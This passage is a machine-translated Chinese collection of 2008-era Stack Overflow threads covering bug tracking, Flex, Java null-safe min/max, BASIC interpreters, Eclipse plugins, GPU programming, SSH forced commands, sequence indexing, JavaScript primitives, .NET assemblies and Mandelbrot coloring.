通常，错误跟踪系统假设它们是要修复或实施的事物的列表。跟踪需求或其他文档（例如任务列表）中的错误似乎不是一回事。更多的是保留记录，以便您可以趋势问题并评估您是否减少了它们。

我正在跟踪它们，但在我们的错误跟踪系统之外。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-12-15T19:10:08.103

嗯……你可以改进的任何事情，都可以改进！

将这一切都视为错误跟踪是有道理的 - 正如您所注意到的，意见会有所不同 - 但使用一个跟踪系统可以给出一个连贯的大图，让任务被分配等等。也许是一个演示、幻灯片或针对目标的东西以超越原始源代码跟踪的方式使用这些系统——图片比文字更能说服人。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-12-15T19:12:32.887

我通常会跟踪所有缺陷的来源。它们可能会在代码中得到修复，但不一定是由此引起的。

错误的需求，错误解释的需求，糟糕的设计，开发人员的brainf * rt，错误的文档，错误的测试，缺失的测试，过时的测试，不符合开发人员所做的代码，工具/编译器错误（在我看来非常罕见） , 构建系统问题....

对我来说，它们都是“系统没有按照客户的意愿去做”，并且都表明必须改变一些东西才能让它按照客户的意愿去做。争论它是缺陷还是功能，还是源代码错误或其他问题会分散我解决问题的注意力。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-12-15T19:17:19.867

似乎没有人提到的一个大问题是创建一个包含不良气味和陷阱的数据库，以便在进行同行评审时使用。

对于实际执行审核的同行来说，这是一个非常宝贵的资源。

从长远来看，它肯定会有所回报。这也应该是一个实时文档、数据库等，添加为：

*   错误已修复
*   当同行进行审查时，以及
*   随着新血液的到来加入团队，带来新的知识和经验。

HTH。

干杯，

抢

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2008-12-15T19:30:25.567

绝对。如果您的过程足够好，可以追溯缺陷的来源，从而产生良好的效果。它可以帮助客户和设计师确定他们操作的约束条件。

客户：开发割草机器人，将所有草叶切割成精确统一的长度

设计师：我们将使用垂直于地面安装的左撇子幼儿园剪刀确保清晰/精确的剪裁

QA：切割是精确的。

客户：为什么机器人需要 6 天才能割草。我们需要在 30 分钟或更短的时间内！

清楚地跟踪性能缺陷的来源有助于塑造对话并改进未来的流程。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2008-12-15T19:37:23.307

我们使用相同的跟踪工具跟踪软件中的错误、文档中的错误、图纸中的错误以及对新功能的请求。

# apache-flex - Flex：无效数据

> ID：369380
> 
> 赞同：0
> 
> 时间：2008-12-15T19:07:04.193
> 
> 标签：apache-flex, actionscript

当参数发生变化时，我无法让我的组件更新：

```
package mycompany
{

    import flash.events.Event;
    import mx.events.SliderEvent;
    import mx.controls.HSlider;
    import mx.controls.sliderClasses.Slider;

    public class FromToSlider extends HSlider
    {

        /* from: */

        private var _from:int;

        [Bindable]
        public function get from():int
        {
            return _from;
        }

        public function set from(value:int):void
        {
            this._from = value;
            this.values[0] = value;
            invalidateProperties();
        }

        /* //from */

        /* to: */

        private var _to:int;

        [Bindable]
        public function get to():int
        {
            return _to;
        }

        public function set to(value:int):void
        {
            this._to = value;
            this.values[1] = value;
        }

        /* //to */

        override public function initialize():void
        {
            super.initialize();
            addEventListener(SliderEvent.CHANGE, handleChange, false, 0, true);
        }

        protected function handleChange(event:SliderEvent):void
        {
            var ct:Slider=Slider(event.currentTarget);
            this.from = ct.values[0];
            this.to = ct.values[1];
        }

    }
} 
```

当我设置“从”和“到”时，拇指没有更新。我试过 invalidateProperties 但这没有用。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-15T20:19:57.667

在 invalidateProperties() 之后添加对 invalidateDisplayList() 的调用。这将确保 Flex 在下一个关键帧上重绘组件。

您还应该将其添加到“set to()”函数中。

# java - 从主要包含空值的 Comparables 列表中获取最小值和最大值的最佳方法是什么？

> ID：369383
> 
> 赞同：6
> 
> 时间：2008-12-15T19:08:30.620
> 
> 标签：java, collections, comparable

我正在考虑这样的事情：

```
public static <T extends Comparable<T>> T minOf(T...ts){        
    SortedSet<T> set = new TreeSet<T>(Arrays.asList(ts));
    return set.first();
}

public static <T extends Comparable<T>> T maxOf(T...ts){
    SortedSet<T> set = new TreeSet<T>(Arrays.asList(ts));
    return set.last();
} 
```

但不是空安全的，这也是我想要的。

你知道解决这个问题的更好方法吗？

编辑：

发表评论后，我也尝试了 min()：

```
public static <T extends Comparable<T>> T minOf(T...ts){        
    return Collections.min(Arrays.asList(ts), new Comparator<T>(){

        public int compare(T o1, T o2) {
            if(o1!=null && o2!=null){
                return o1.compareTo(o2);
            }else if(o1!=null){
                return 1;
            }else{
                return -1;  
            }
        }});
} 
```

你对那个怎么想的？

* * *

## 回答 #1

> 赞同：38
> 
> 时间：2008-12-15T19:13:19.220

[Collections.max](http://java.sun.com/javase/6/docs/api/java/util/Collections.html#max(java.util.Collection))有什么问题？

为什么你关心零安全？您确定要允许空值出现在您的集合中吗？

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2008-12-15T19:19:10.097

如果你真的需要从结果中排除“null”，并且你不能阻止它出现在你的数组中，那么也许你应该用一个简单的循环遍历数组并跟踪“min”和“max” " 在单独的变量中。您仍然可以在每个对象上使用“compare()”方法将其与当前的“min”和“max”值进行比较。这样，您可以添加自己的代码来检查空值并忽略它们。

编辑：这里有一些代码来说明我在说什么。不幸的是，您需要考虑一个极端情况——如果传入的所有参数都为空怎么办？你的方法返回什么？

```
public static <T extends Comparable<T>> T minOf(T...ts){
    T min = null;
    for (T t : ts) {
        if (t != null && (min == null || t.compareTo(min) < 0)) {
            min = t;
        }
    }
    return min;
}

public static <T extends Comparable<T>> T maxOf(T...ts){
    T max = null;
    for (T t : ts) {
        if (t != null && (max == null || t.compareTo(max) > 0)) {
            max = t;
        }
    }
    return max;
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-06-02T12:26:51.170

您*不应该*实现`Comparable`接受 null，因为它违反了接口的合同。

来自[https://docs.oracle.com/javase/7/docs/api/java/lang/Comparable.html](https://docs.oracle.com/javase/7/docs/api/java/lang/Comparable.html)：

> 请注意，null 不是任何类的实例，即使 e.equals(null) 返回 false，e.compareTo(null) 也应该抛出 NullPointerException。

相反，您必须创建一个新接口，例如`ComparableNull`。

也可以看看：

*   [当参数字符串为空时，int compareTo() 应该返回什么？](https://stackoverflow.com/questions/6259354/what-should-int-compareto-return-when-the-parameter-string-is-null)
*   [如何简化 null 安全的 compareTo() 实现？](https://stackoverflow.com/questions/481813/how-to-simplify-a-null-safe-compareto-implementation)

# python - Ruby/Python 中有开源 BASIC 解释器吗？

> ID：369391
> 
> 赞同：2
> 
> 时间：2008-12-15T19:12:11.407
> 
> 标签：python, ruby, interpreter

我想要一些简单的东西来进行实验/破解。我为 c 创建了很多解释器/编译器，我只想要一些简单的东西。一个基本的 BASIC :D

如果你不知道（我已经完成了我的谷歌搜索......），yacc/bison 是唯一的方法吗？

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-12-16T18:02:36.460

[PLY](http://www.dabeaz.com/ply/)是一个很棒的 Python 解析器创建库。它有一个简单的 BASIC 解释器作为其示例脚本之一。你可以从那里开始。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-12-15T19:28:45.320

[TheFreeCountry](http://www.thefreecountry.com/compilers/basic.shtml)中列出的这些都不可接受？它们都不是在 Python 中，但我应该认为从[XBLite](http://www.xblite.com/)开始 可能比从 Yacc/Bison/ [PLY](http://www.dabeaz.com/ply/)开始更有帮助。

此外，[Vb2py](http://vb2py.sourceforge.net/)可能是比 PLY 更好的起始位置。

但是，如果您必须走 PLY 路线，请将[MOLE 基本](http://www.xs4all.nl/~merty/mole/)语法作为起点，而不是尝试从头开始编写自己的语法。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-15T21:44:43.597

我也不知道 ruby​​ 下的基本解释器，但只要有足够的时间和兴趣，ruby 很容易“支持”为您喜欢的任何语言编写解释器：[Agile DSL Development in Ruby](http://obiefernandez.com/presentations/obie_fernandez-agile_dsl_development_in_ruby.pdf)。我必须承认，这种方法需要投入一些时间。:( 在演示文稿的最后是一些链接到有关 DSL 的进一步阅读。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-12-16T00:51:10.753

您可能还希望检查[Parrot 虚拟机](http://en.wikipedia.org/wiki/Parrot_virtual_machine)，根据今天的维基百科，它具有一些 BASIC 支持。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-12-16T18:31:49.817

ruby 中的 miniBasic 可[在此处](http://rockit.sourceforge.net/)获得。Rockit 似乎比 racc 更有趣。

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2012-09-05T12:02:03.550

有pybasic（python基础），rockit-minibasic（rubybasic）。

为了使这些能够使用 gui，必须使用 kivy 和 shoes gui 工具包分别为 pybasic 和 rockit-minibasic 以及类似的 prima gui 为 perlbasic 开发扩展（如果有的话）。

# .net - 设计器视图中的 Windows 窗体控件中的错误

> ID：369393
> 
> 赞同：32
> 
> 时间：2008-12-15T19:12:56.273
> 
> 标签：.net, visual-studio, winforms

有时，我在 Visual Studio 2008 中某些用户控件的设计模式下收到以下错误：

> 文件“UserControl.vb”不支持代码解析或生成，因为它不包含在支持代码的项目中。

它不会始终如一地发生，但它发生得足以令人讨厌。此错误是否有任何常见原因？

是的，它在一个支持代码的项目中——我上次检查过，WinForms 项目中通常有代码！

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2008-12-15T20:13:20.923

这是VS中的一个错误。它也发生在VS2005中。

不要浪费你的时间：关闭 VS，再次打开它，一切都应该正常。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-01-09T19:00:38.100

请注意，有一个 Microsoft Connect 问题：[https ://connect.microsoft.com/VisualStudio/feedback/ViewFeedback.aspx?FeedbackID=366006](https://connect.microsoft.com/VisualStudio/feedback/ViewFeedback.aspx?FeedbackID=366006)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-10-10T22:33:01.107

我已恢复（通过源代码管理）对项目文件的更改，这从我的解决方案（特别是 .Designer 文件）中删除了该文件。但是，我仍然在 Visual Studio 中打开了该文件，并试图向设计器展示它导致了这个错误。

我单击解决方案资源管理器顶部的“显示所有文件”按钮，找到未包含的文件。右键单击并选择“包含在项目中”并重建为我解决了这个问题。

# java - 您最喜欢的 Eclipse 插件是什么？

> ID：369406
> 
> 赞同：14
> 
> 时间：2008-12-15T19:17:08.713
> 
> 标签：java, eclipse, eclipse-plugin

我使用的唯一插件是完成我的工作所需的插件，例如 SoapUI、Maven 和 SVN。我想知道是否有一些插件可以让我的生活更轻松。是否有任何您认为非常宝贵的 Eclipse 插件？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2008-12-15T19:23:49.760

[findbugs](http://findbugs.sourceforge.net/)毫无疑问！

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2008-12-15T20:13:10.737

[用于SVN](http://subclipse.tigris.org/)集成的子剪辑

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2008-12-15T19:18:40.007

米林很帅。

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2008-12-15T19:25:49.490

[这与这个问题](https://stackoverflow.com/questions/2826/do-you-have-any-recommended-add-onsplugins-for-eclipse)非常相似。

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2008-12-15T19:25:17.387

[用于代码覆盖的EclEmma](http://www.eclemma.org/)是我最喜欢的（当然除了我自己的插件 :-)）

* * *

## 回答 #6

> 赞同：5
> 
> 时间：2009-02-04T02:50:12.280

[StartExplorer可以在资源管理器](http://startexplorer.sourceforge.net/)*和*cmd.exe中打开文件/文件夹，除了将路径复制到剪贴板和其他我很少使用的东西——我一直用它来制作命令窗口。

* * *

## 回答 #7

> 赞同：4
> 
> 时间：2008-12-18T14:45:23.330

[Jadclips](http://jadclipse.sourceforge.net)（与[Jad](http://www.kpdus.com/jad.html)反编译器集成）

* * *

## 回答 #8

> 赞同：4
> 
> 时间：2008-12-15T21:40:53.353

我主要做网络开发，所以我决定使用[Aptana](http://www.aptana.com)。它基本上是 Eclipse 预打包的，其中包含您需要的所有 Web 开发插件。一探究竟。真的很棒。

* * *

## 回答 #9

> 赞同：4
> 
> 时间：2008-12-16T10:28:11.230

[Checkstyle](http://eclipse-cs.sourceforge.net/)用于代码样式检查等。

* * *

## 回答 #10

> 赞同：4
> 
> 时间：2011-04-06T08:10:15.740

[鼠标饲料](http://www.mousefeed.com/)

每当您单击工具栏图标、菜单或上下文菜单时，有一个热键可以让您完成相同的操作，它会显示一个弹出窗口来提醒您（参见下面的示例）。

您最终会在使用 eclipse 快捷方式时学习它并变得更有效率。

![在此处输入图像描述](https://i.stack.imgur.com/mfZ4C.png)

* * *

## 回答 #11

> 赞同：3
> 
> 时间：2009-05-22T17:40:46.583

[颠覆](http://www.eclipse.org/subversive/)我比 Subclipse 更喜欢。将 SVN 集成为团队提供者很好。我有一段时间没有使用 Subclipse，但它可能比以前好多了。

* * *

## 回答 #12

> 赞同：2
> 
> 时间：2008-12-15T19:49:53.577

我真的很喜欢[QuantumDB](http://quantum.sourceforge.net)，尤其是在 Linux 上，它缺乏用于数据库工作的体面的 GUI 工具。

RunJettyRun也让运行 Web 应用程序变得[轻而易举。](http://code.google.com/p/run-jetty-run)

* * *

## 回答 #13

> 赞同：2
> 
> 时间：2008-12-15T20:07:12.857

[QuickREx](http://www.bastian-bergerhoff.com/eclipse/features/web/QuickREx/toc.html)满足您所有的正则表达式需求。

* * *

## 回答 #14

> 赞同：2
> 
> 时间：2008-12-15T21:53:44.997

PyDev 非常棒。不过，仅适用于新版本的 Eclipse。

埃德

* * *

## 回答 #15

> 赞同：2
> 
> 时间：2008-12-22T17:13:44.227

有线。这是一个用于探索 Java 代码的创新插件。它使您可以导航、搜索和可视化您的代码。这是完全上瘾的。[nWire 网站](http://nwiresoftware.com/)上有一个[简短的演示](http://nwiresoftware.com/introduction/screencast)。

* * *

## 回答 #16

> 赞同：2
> 
> 时间：2009-05-22T17:23:37.743

*   子剪辑
*   格纹风格
*   查找错误
*   春季IDE
*   m2eclipse (Maven 插件)
*   PMD
*   Jadclipse（反编译器）

* * *

## 回答 #17

> 赞同：2
> 
> 时间：2009-06-12T15:10:37.020

与编程没有直接关系，但出于文档原因，我非常喜欢[XMind](http://www.xmind.net)（思维导图工具）和 TeXlipse（LaTeX 环境，在 Sourceforge 上，抱歉，但无法发布第二个超链接）的免费版本。

我喜欢前面提到的一些，例如 Findbugs。

我支持 Jay R.，尽管 Subclipse 更易于安装（至少在 Mac 上），但我宁愿使用 Subversive 来代替 Subclipse。

* * *

## 回答 #18

> 赞同：1
> 
> 时间：2008-12-24T04:44:05.393

[P4WSAD](http://www.perforce.com/perforce/products/p4wsad.html)。在 Eclipse 中获得 Perforce 支持真是太好了。

* * *

## 回答 #19

> 赞同：1
> 
> 时间：2008-12-16T17:19:27.280

[ContextMenuPlugin](http://www.geocities.com/richard_hoefter/ContextMenuPlugin/) makes the Windows Explorer context menu available when right-clicking on objects in navigator views, and on editor frames. It passes the clicked file or folder to the selected function.

This is especially valuable if you have useful Explorer extensions. I use this to invoke Tortoise CVS & SVN functions, to open a Command prompt in the corresponding directory, etc.

* * *

## 回答 #20

> 赞同：1
> 
> 时间：2008-12-15T19:26:45.917

[日食](http://www.myeclipseide.com/)

* * *

## 回答 #21

> 赞同：1
> 
> 时间：2011-06-26T10:53:25.667

*   TaskTop 对于跟踪我必须做的事情很重要
*   XText 是非常令人印象深刻的技术——在 XText 之前我们做了什么？
*   内存分析器非常适合查找各种内存相关问题
*   薄荷只是..好。它使用相关的生态信息为大纲视图着色。
*   阿特拉斯工具...

* * *

## 回答 #22

> 赞同：1
> 
> 时间：2008-12-16T00:55:36.080

我正在使用 VisualVM 对我们的 java 程序进行分析和性能分析。

* * *

## 回答 #23

> 赞同：1
> 
> 时间：2008-12-16T08:31:34.710

使用 Visual Dataflex，[Eclipse 插件的 Visual DataFlex 工具](http://resheim.no/vdf)是必须的！

* * *

## 回答 #24

> 赞同：1
> 
> 时间：2008-12-16T09:10:50.217

以前我使用的是 MyEclipse，但现在我正在迁移到 Seam 并且我正在使用[JBoos Tools](http://www.jboss.org/tools/)

* * *

## 回答 #25

> 赞同：1
> 
> 时间：2011-04-01T08:07:28.110

[JD-Eclipse Java反编译器](http://java.decompiler.free.fr/?q=jdeclipse)

IMO 它比[Jadclipse 好得多](http://sourceforge.net/projects/jadclipse/)

* * *

## 回答 #26

> 赞同：1
> 
> 时间：2009-05-22T17:30:20.340

弹性生成器：D

* * *

## 回答 #27

> 赞同：1
> 
> 时间：2009-05-22T17:37:01.160

（无耻的插件）我喜欢将[FogBugz 集成到 Eclipse](http://www.foglyn.com)中:-)

* * *

## 回答 #28

> 赞同：0
> 
> 时间：2011-06-26T07:27:39.473

有时您可能会发现[快速代码](http://fast-code.sourceforge.net/)插件非常有用。

* * *

## 回答 #29

> 赞同：0
> 
> 时间：2011-12-11T16:36:45.807

[JarClassFinder](http://developeriq.in/articles/2007/jun/18/jarclassfinder-and-log-watcher-eclipse-plug-ins/)对我非常有用。

# image-processing - GPU 编程新手：学习什么？

> ID：369411
> 
> 赞同：2
> 
> 时间：2008-12-15T19:18:34.640
> 
> 标签：image-processing, gpu

我正在将某个场景渲染到屏幕外帧缓冲区 (FBO)，然后我正在读取渲染图像，`glReadPixels()`用于在 CPU 上进行处理。该处理涉及一些非常简单的扫描例程和数据提取。

在分析之后，我意识到我的应用程序所做的大部分事情都是花费时间`glReadPixels()`——超过 50% 的时间。所以自然的步骤是将处理转移到 GPU 上，这样就不必复制数据了。

所以我的问题是 - 将这样的东西编程到 GPU 的最佳方法是什么？
GLSL？
库达？
还有什么我目前不知道的吗？
主要要求是它可以访问渲染的屏幕外帧缓冲区（或纹理数据，因为可以渲染到纹理）并能够将一些信息输出到 CPU，比如 1 -2Kb 每帧。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-12-15T19:23:25.050

您可能会在“ [GPU 编程简介](https://stackoverflow.com/questions/219928/intro-to-gpu-programming)”问题中找到有用的答案。

-亚当

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-27T20:19:38.030

在其他问题中有许多关于 GPU 编程入门的指针，但是如果您有一个已经使用 OpenGL 构建的应用程序，那么您的问题可能真的是“哪个将与 OpenGL 互操作”？

毕竟，您的重点是避免使用 glReadPixels() 将 FBO 从 GPU 读回 CPU 的开销。例如，如果您无论如何都必须读回它，然后将数据复制到 CUDA 缓冲区中，然后使用 CUDA API 将其传输回 gpu，那么就没有多大意义了。

所以你需要一个 GPGPU 包，它将你的 OpenGL FBO 对象直接作为输入，而不需要任何额外的复制。

这可能会排除除 GLSL 之外的所有内容。

我不能 100% 确定 CUDA 是否有任何方式可以直接在 OpenGL 缓冲区对象上进行操作，但我认为它没有这个功能。

我确信 ATI 的 Stream SDK 不会那样做。（虽然它将与 DirectX 互操作。）

我怀疑带有计算着色器的 DirectX 11“技术预览”是否具有该功能。

**编辑：** 跟进：看起来 CUDA，至少是最新版本，对 OpenGL 互操作性有一些支持。如果是这样，那可能是你最好的选择。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-05-21T19:54:32.893

我最近发现了这个[现代 GPU](http://nvlabs.github.io/moderngpu/index.html)

# python - Python：os.environ.get('SSH_ORIGINAL_COMMAND') 返回无

> ID：369414
> 
> 赞同：2
> 
> 时间：2008-12-15T19:19:50.313
> 
> 标签：python, ssh

尝试遵循发现的技术`bzr`，`gitosis`我做了以下事情：

添加到指向名为“my_parser”并位于的python脚本文件 `~/.ssh/authorized_keys`的参数中 （文件被chmoded为777）`command="my_parser"``/usr/local/bin`

在该脚本文件中，`'/usr/local/bin/my_parser'`我得到以下几行：

```
#!/usr/bin/env python
import os
print os.environ.get('SSH_ORIGINAL_COMMAND', None) 
```

例如，当我尝试 ssh 时，`ssh localhost` 我进入`None`终端，然后连接关闭。

我想知道过去是否有人做过类似的事情并且可以帮助我。

为了获取该环境变量，我应该在我的 python 文件中做些什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-15T20:19:40.100

`$SSH_ORIGINAL_COMMAND`当您使用 ssh 连接到主机以执行单个命令时设置：

```
$ ssh username@host 'some command' 
```

然后，您的“my_parser”将返回“某些命令”。

除非您使用 my_parser 调用 shell，否则它将退出，并且连接将关闭。您可以使用它来控制远程执行命令的环境，但您无法进行交互式会话

# mapping - 约束序列到索引映射

> ID：369417
> 
> 赞同：1
> 
> 时间：2008-12-15T19:21:59.563
> 
> 标签：mapping, discrete-mathematics

我对如何将一组序列映射到连续整数感到困惑。

所有的序列都遵循这个规则：

```
A_0 = 1
A_n >= 1
A_n <= max(A_0 .. A_n-1) + 1 
```

我正在寻找一种解决方案，它能够在给定这样的序列的情况下计算一个整数以查找表并给定表中的索引，生成序列。

示例：对于长度 3，有 5 个有效序列。执行以下地图（最好是双向）的快速功能将是一个很好的解决方案

```
1,1,1   0
1,1,2   1
1,2,1   2
1,2,2   3
1,2,3   4 
```

* * *

*   练习的重点是获得一个在有效序列和单元格之间具有 1-1 映射的打包表。
*   集合的大小仅受可能的唯一序列数的限制。
*   我现在不知道序列的长度是多少，但它会是一个很小的，<12，预先知道的常数。
*   我迟早会谈到这个，但我会把它扔掉，让社区在此期间获得“乐趣”。

* * *

这些是不同的有效序列

```
1,1,2,3,2,1,4
1,1,2,3,1,2,4
1,2,3,4,5,6,7
1,1,1,1,2,3,2 
```

这些不是

```
1,2,2,4
2,
1,1,2,3,5 
```

* * *

与[此相关](https://stackoverflow.com/questions/346760/how-to-find-equivalent-texts)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-15T19:53:16.800

我认为没有排序的哈希应该是事情。

由于 A0 总是以 0 开头，我认为我们可以将序列视为以 12 为底的数字，并使用其以 10 为底的数字作为查找的键。（仍然不确定这一点）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2010-12-07T14:39:17.463

有一个自然的序列索引，但没有那么容易计算。

因为 A_0 = 1，所以让我们寻找 n>0 的 A_n。

索引分两步完成。

## 第1部分：

按 A_n = max(A_0 .. A_n-1) + 1 的位置对序列进行分组。将这些位置称为*步骤*。

*   上的步骤是连续的数字（2,3,4,5,...）。
*   在非步数的地方，我们可以输入从 1 到索引小于 k 的步数。

每个组可以表示为二进制字符串，其中 1 是步进，0 是非步进。例如 001001010 表示具有 112aa3b4c、a<=2、b<=3、c<=4 的组。因为，组是用二进制数索引的，所以组的自然索引。从 0 到 2^length - 1。让我们调用 group 二进制表示*group order*的值。

## 第2部分：

组内的索引序列。由于组定义了步进位置，因此只有非步进位置上的数字是可变的，并且它们在定义的范围内是可变的。这样就可以很容易地在该组内索引给定组的序列，并按字典顺序排列变量位置。

很容易计算一组中的序列数。它是 1^i_1 * 2^i_2 * 3^i_3 * ... 形式的数字。

## 结合：

这给出了一个 2 部分键：`<Steps, Group>`然后需要将其映射到整数。为此，我们必须找出组中有多少序列的顺序小于某个值。为此，让我们首先找出给定长度的组中有多少个序列。这可以通过所有组和对序列的数量求和或类似的循环来计算。令 T(l, n) 为长度为 l 的序列数（省略 A_0），其中第一个元素的最大值可以是 n+1。比持有：

```
T(l,n) = n*T(l-1,n) + T(l-1,n+1)
T(1,n) = n 
```

因为`l + n <= sequence length + 1`有`sequence_length^2/2`〜T（l，n）值，可以很容易地计算出来。

接下来是计算顺序小于或等于给定值的组中的序列数。这可以通过对 T(l,n) 值求和来完成。例如，顺序 <= 1001010 二进制的组中的序列数等于

```
T(7,1) +         # for 1000000
2^2 * T(4,2) +   # for 001000
2^2 * 3 * T(2,3) # for 010 
```

## 优化：

这将给出一个映射，但最好是直接实现组合关键部分`>O(1)`。另一方面，`Steps`键的部分很小，通过计算`Groups`每个`Steps`值的范围，查找表可以将其减少到`O(1)`.

我不是 100% 确定上面的公式，但它应该是这样的。

通过这些评论和重复，可以使函数序列 -> 索引和索引 -> 序列。但不是那么微不足道:-)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-15T19:32:22.770

这是一个 python 函数，假设您将这些值存储在文件中并将这些行传递给函数，它可以为您完成这项工作

```
def valid_lines(lines):
    for line in lines:
        line = line.split(",")
        if line[0] == 1 and line[-1] and line[-1] <= max(line)+1:
            yield line

lines = (line for line in open('/tmp/numbers.txt'))
for valid_line in valid_lines(lines):
    print valid_line 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-15T19:36:57.707

给定序列，我会对它进行排序，然后使用排序序列的哈希作为表的索引。

# javascript - 关于 JavaScript 中 object.method 的问题

> ID：369424
> 
> 赞同：5
> 
> 时间：2008-12-15T19:23:16.097
> 
> 标签：javascript, oop, methods

[这是对此](https://stackoverflow.com/questions/369220/why-should-you-not-use-number-as-a-constructor)问题的后续问题。

看看这两个例子：

```
var number1 = new Number(3.123);
number1 = number1.toFixed(2); 
alert(number1);

var number2 = 3.123;
number2 = number2.toFixed(2);
alert(number2); 
```

我意识到它们最终都具有相同的值，但是引用原始值的方法是否正确？（换句话说，3.123.method 与 object.method 相对？）

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-12-15T19:40:54.110

从技术上讲，没有。您可以将其视为原始值的方法，因为 number2 将被转换为`Number`对象，然后`toFixed`在该对象上调用 is。

当您在字符串上调用方法时，也会发生同样的事情。

为了说明发生了什么，您可以运行以下代码：

```
Object.prototype.type = function() { return typeof this; }

var string = "a string";
var number = 42;

alert(typeof string); // string
alert(string.type()); // object

alert(typeof number); // number
alert(number.type()); // object 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-12-15T19:41:03.890

在 JavaScript 中，一切都是对象，甚至函数和整数。考虑数字和字符串的方法是完全可以的。例如：

```
>>> (3.123).toString()
"3.123" 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2008-12-15T20:39:44.507

对使用原始值初始化的字面量值或变量调用方法与首先将值强制为适当类型的 Object 然后在其上调用方法具有相同的效果。下面的实验比试图用语言解释这一点要好：

```
Object.prototype.getPrototype = function() { return "Object"; };
Number.prototype.getPrototype = function() { return "Number"; };

function test(v) {
    alert("proto: " + v.getPrototype()
        + ", type: " + typeof v
        + ", is a Number: " + (v instanceof Number)
        + ", is an Object: " + (v instanceof Object));
}

// proto: Number, type: number, is a Number: false, is an Object: false
test(42);

// proto: Number, type: number, is a Number: false, is an Object: false
test(Number(42));

// proto: Number, type: object, is a Number: true, is an Object: true
test(Object(42));

// proto: Number, type: object, is a Number: true, is an Object: true
test(new Number(42)); 
```

# .net - 从 2.0 应用程序引用 3.5 程序集？

> ID：369425
> 
> 赞同：5
> 
> 时间：2008-12-15T19:23:18.403
> 
> 标签：.net, .net-3.5, .net-2.0, assemblies, reference

我有一个针对 .NET 3.5 的程序集。

我有一个针对 .NET 2.0 的应用程序，想知道从 2.0 应用程序引用 3.5 程序集是否有任何问题。

我知道 IL 应该是相同的，所以我假设它会起作用，但想听听其他尝试过这个的人的一些经验。

运行时环境将安装 2.0 和 3.5。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2008-12-15T19:27:00.190

这里没有问题。只有一个运行时版本执行该应用程序。.NET 框架 v2.0。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-02-22T17:55:17.227

但是 - 在部署 .net2.0 应用程序时，系统会提示您的用户安装 .net3.5（因为引用了 .net 3.5 程序集）。

# algorithm - Mandelbrot 集渲染的平滑光谱

> ID：369438
> 
> 赞同：37
> 
> 时间：2008-12-15T19:26:33.750
> 
> 标签：algorithm, colors, fractals, mandelbrot

我目前正在编写一个程序来生成非常巨大的（65536x65536 像素及以上）Mandelbrot 图像，我想设计一个光谱和着色方案来使它们公正。维基[百科的特色 mandelbrot 图像](http://en.wikipedia.org/wiki/File:Mandel_zoom_00_mandelbrot_set.jpg)似乎是一个很好的例子，尤其是调色板如何在序列的所有缩放级别保持变化。不过，我不确定它是在旋转调色板还是在做其他一些技巧来实现这一点。

我熟悉 mandelbrot 集的[平滑着色算法](http://en.wikipedia.org/wiki/Mandelbrot_set#Continuous_.28smooth.29_coloring)，所以我可以避免条带，但我仍然需要一种方法来为该算法的输出值分配颜色。

我正在生成的图像是金字塔形的（例如，一系列图像，每个图像的尺寸都是前一个的一半），所以我可以使用某种旋转调色板，只要在后续调色板之间发生变化缩放级别不是太明显。

* * *

## 回答 #1

> 赞同：42
> 
> 时间：2009-08-07T09:21:25.367

**这是平滑颜色算法：**

假设您从复数开始`z0`并迭代`n`次数，直到它逃脱。设终点为`zn`。

一个平滑的值是

```
nsmooth := n + 1 - Math.log(Math.log(zn.abs()))/Math.log(2) 
```

这仅适用于 mandelbrot，如果您想计算 julia 集的平滑函数，请使用

```
Complex z = new Complex(x,y);
double smoothcolor = Math.exp(-z.abs());

for(i=0;i<max_iter && z.abs() < 30;i++) {
    z = f(z);
    smoothcolor += Math.exp(-z.abs());
} 
```

然后`smoothcolor`就是在区间`(0,max_iter)`。

除以`smoothcolor`得到`max_iter`0 和 1 之间的值。

**要从值中获得平滑的颜色：**

这可以被称为，例如（在 Java 中）：

```
Color.HSBtoRGB(0.95f + 10 * smoothcolor ,0.6f,1.0f); 
```

因为 HSB 颜色参数中的第一个值用于定义色环的颜色。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2008-12-16T09:22:43.547

使用平滑着色算法计算视口中的所有值，然后将调色板从最低值映射到最高值。因此，当您放大并且不再可见较高的值时，调色板也会按比例缩小。对于 n 和 B 使用相同的常数，对于完全缩小的设置，您最终会得到 0.0 到 1.0 的范围，但在更深的缩放中，动态范围会缩小，例如 200% 缩放时为 0.0 到 0.1，在 200% 缩放时为 0.0 到 0.0001 20000% 变焦等

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2013-09-07T23:19:44.753

